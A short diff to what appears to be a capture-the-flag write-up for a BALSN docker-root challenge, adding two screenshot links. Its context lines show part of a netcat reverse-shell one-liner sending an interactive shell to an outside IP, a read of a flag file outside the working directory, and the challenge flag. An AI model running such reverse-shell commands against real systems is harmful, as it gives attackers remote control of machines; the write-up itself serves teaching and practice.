@@ -59,7 +59,10 @@ cat /tmp/f|sh -i 2>&1|nc 102.122.100.112 1000 >/tmp/f
 ```
 $cat ../../flag2
 BALSN{d0cK3r_baD_8ad_ro07_B4d_b@d}
+![image](https://user-images.githubusercontent.com/82523299/188469974-a4c53d99-5f8d-4ea7-8eb8-ef6a55677d72.png)
+
 ```
+![image](https://user-images.githubusercontent.com/82523299/188470169-d81c2569-cec4-4682-b305-bfecf665377f.png)
 
 #### FLAG: BALSN{d0cK3r_baD_8ad_ro07_B4d_b@d}
 
